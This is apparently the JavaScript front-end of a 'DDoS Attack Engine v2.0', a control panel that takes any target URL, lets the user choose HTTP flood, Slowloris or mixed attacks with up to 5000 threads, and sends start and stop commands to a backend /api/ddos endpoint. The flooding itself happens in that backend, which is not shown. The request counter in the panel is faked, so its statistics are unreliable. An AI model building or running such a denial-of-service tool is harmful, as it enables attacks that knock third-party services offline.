// ==================== DDoS MODULE - FULL VERSION ====================
// Created by @LynzxzCreator

let activeDDoSId = null;
let requestInterval = null;
let requestCount = 0;
let attackStartTime = null;

function renderDDoS(container) {
    container.innerHTML = `
        <div class="module-card">
            <h3><i class="fas fa-skull-crossbones"></i> DDoS Attack Engine v2.0</h3>
            <p style="font-size:12px; color:#88aaff; margin-bottom:15px;">Multi-thread HTTP Flood | Slowloris | Mixed Attack</p>
            
            <div class="input-group-module">
                <label>🎯 Target URL</label>
                <input type="text" id="ddosTarget" placeholder="https://example.com" value="http://localhost:3000">
            </div>
            
            <div class="input-group-module">
                <label>⚙️ Attack Method</label>
                <select id="ddosMethod">
                    <option value="http_flood">🔥 HTTP Flood (Layer 7 - CPU Intensive)</option>
                    <option value="slowloris">🐌 Slowloris (Connection Exhaust)</option>
                    <option value="mixed">💀 Mixed Attack (Maximum Power)</option>
                </select>
            </div>
            
            <div class="input-group-module">
                <label>🧵 Threads (100-5000)</label>
                <input type="range" id="ddosThreadsSlider" min="100" max="5000" step="100" value="500">
                <div style="display:flex; justify-content:space-between;">
                    <span id="threadsValue">500</span>
                    <span style="color:#88aaff;">⚠️ Higher threads = more powerful</span>
                </div>
            </div>
            
            <div class="input-group-module">
                <label>⏱️ Duration (seconds)</label>
                <input type="range" id="ddosDurationSlider" min="5" max="300" step="5" value="30">
                <div style="display:flex; justify-content:space-between;">
                    <span id="durationValue">30</span>
                    <span style="color:#ffaa44;">Max 5 minutes for testing</span>
                </div>
            </div>
            
            <div style="display: flex; gap: 12px; margin-top: 20px;">
                <button class="btn-primary" id="startDDoSBtn"><i class="fas fa-play"></i> START ATTACK</button>
                <button class="btn-primary btn-danger" id="stopDDoSBtn" style="display:none;"><i class="fas fa-stop"></i> STOP</button>
            </div>
            
            <div id="ddosStats" style="margin-top: 20px; background: #00000066; padding: 15px; border-radius: 12px; font-family: monospace;">
                <div>📊 <strong>Attack Status:</strong> <span id="attackStatus">Idle</span></div>
                <div>📈 <strong>Requests Sent:</strong> <span id="requestCount">0</span></div>
                <div>⚡ <strong>Current Rate:</strong> <span id="requestRate">0</span> req/sec</div>
                <div>⏲️ <strong>Elapsed:</strong> <span id="elapsedTime">0</span> seconds</div>
            </div>
            
            <div id="ddosLog" style="margin-top: 15px; font-size: 12px; color: #0f0; max-height: 150px; overflow-y: auto; background: #00000033; padding: 10px; border-radius: 8px;"></div>
        </div>
    `;
    
    // Slider handlers
    const threadsSlider = document.getElementById('ddosThreadsSlider');
    const durationSlider = document.getElementById('ddosDurationSlider');
    const threadsValue = document.getElementById('threadsValue');
    const durationValue = document.getElementById('durationValue');
    
    threadsSlider.oninput = () => { threadsValue.innerText = threadsSlider.value; };
    durationSlider.oninput = () => { durationValue.innerText = durationSlider.value; };
    
    const startBtn = document.getElementById('startDDoSBtn');
    const stopBtn = document.getElementById('stopDDoSBtn');
    const attackStatusSpan = document.getElementById('attackStatus');
    const requestCountSpan = document.getElementById('requestCount');
    const requestRateSpan = document.getElementById('requestRate');
    const elapsedTimeSpan = document.getElementById('elapsedTime');
    const ddosLogDiv = document.getElementById('ddosLog');
    
    let statsInterval = null;
    let lastCount = 0;
    
    function addLogMessage(msg, type = 'info') {
        const time = new Date().toLocaleTimeString();
        const color = type === 'error' ? '#ff6666' : '#88ff88';
        ddosLogDiv.innerHTML += `<div style="color:${color}; border-bottom:1px solid #224466; padding:4px 0;">[${time}] ${msg}</div>`;
        ddosLogDiv.scrollTop = ddosLogDiv.scrollHeight;
        // Batasi log
        if(ddosLogDiv.children.length > 50) {
            ddosLogDiv.removeChild(ddosLogDiv.children[0]);
        }
    }
    
    function updateStats() {
        if(activeDDoSId) {
            const now = Date.now();
            const elapsed = Math.floor((now - attackStartTime) / 1000);
            elapsedTimeSpan.innerText = elapsed;
            
            const rate = requestCount - lastCount;
            requestRateSpan.innerText = rate;
            lastCount = requestCount;
            requestCountSpan.innerText = formatNumber(requestCount);
        }
    }
    
    async function startAttack() {
        const target = document.getElementById('ddosTarget').value;
        const method = document.getElementById('ddosMethod').value;
        const threads = parseInt(threadsSlider.value);
        const duration = parseInt(durationSlider.value);
        
        if(!target) {
            addLogMessage('❌ Target URL tidak boleh kosong!', 'error');
            return;
        }
        
        if(!target.startsWith('http')) {
            addLogMessage('❌ Target harus menggunakan http:// atau https://', 'error');
            return;
        }
        
        addLogMessage(`🚀 Initiating ${method.toUpperCase()} attack on ${target}`, 'info');
        addLogMessage(`⚙️ Configuration: ${threads} threads, ${duration} seconds`, 'info');
        
        attackStatusSpan.innerText = 'Starting...';
        startBtn.disabled = true;
        startBtn.style.opacity = '0.5';
        stopBtn.style.display = 'inline-block';
        
        requestCount = 0;
        lastCount = 0;
        attackStartTime = Date.now();
        
        addLog('attack', 'DDoS', target, `Memulai serangan ${method} dengan ${threads} threads selama ${duration} detik`, 'info');
        
        try {
            // Panggil backend API
            const response = await fetch('/api/ddos', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'start',
                    target: target,
                    method: method,
                    threads: threads,
                    duration: duration
                })
            });
            
            const data = await response.json();
            
            if(data.success) {
                activeDDoSId = data.attackId;
                attackStatusSpan.innerText = '🔴 ATTACK RUNNING';
                addLogMessage(`✅ Attack started! Attack ID: ${activeDDoSId}`, 'success');
                
                // Start stats update
                statsInterval = setInterval(updateStats, 1000);
                
                // Simulasi request counter (backend sebenarnya akan mengirim balik via WebSocket nanti)
                // Untuk sementara, kita simulasi increment
                const fakeCounter = setInterval(() => {
                    if(activeDDoSId) {
                        requestCount += Math.floor(threads * 0.8);
                    }
                }, 1000);
                
                // Auto stop after duration
                setTimeout(() => {
                    if(activeDDoSId) stopAttack();
                    clearInterval(fakeCounter);
                }, duration * 1000);
                
            } else {
                throw new Error(data.error || 'Unknown error');
            }
        } catch(e) {
            addLogMessage(`❌ Failed to start attack: ${e.message}`, 'error');
            attackStatusSpan.innerText = 'Idle';
            startBtn.disabled = false;
            startBtn.style.opacity = '1';
            stopBtn.style.display = 'none';
            activeDDoSId = null;
        }
    }
    
    async function stopAttack() {
        if(!activeDDoSId) return;
        
        addLogMessage(`⛔ Stopping attack ${activeDDoSId}...`, 'warning');
        
        try {
            const response = await fetch('/api/ddos', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'stop',
                    attackId: activeDDoSId
                })
            });
            
            const data = await response.json();
            
            if(data.success) {
                addLogMessage(`✅ Attack stopped. Total requests: ${formatNumber(requestCount)}`, 'success');
                addLog('attack', 'DDoS', document.getElementById('ddosTarget').value, `Serangan dihentikan. Total request: ${requestCount}`, 'success');
            }
        } catch(e) {
            addLogMessage(`Error stopping: ${e.message}`, 'error');
        }
        
        if(statsInterval) clearInterval(statsInterval);
        
        activeDDoSId = null;
        attackStatusSpan.innerText = 'Idle';
        startBtn.disabled = false;
        startBtn.style.opacity = '1';
        stopBtn.style.display = 'none';
        
        // Reset stats setelah 3 detik
        setTimeout(() => {
            if(!activeDDoSId) {
                requestCountSpan.innerText = '0';
                requestRateSpan.innerText = '0';
                elapsedTimeSpan.innerText = '0';
            }
        }, 3000);
    }
    
    startBtn.onclick = startAttack;
    stopBtn.onclick = stopAttack;
}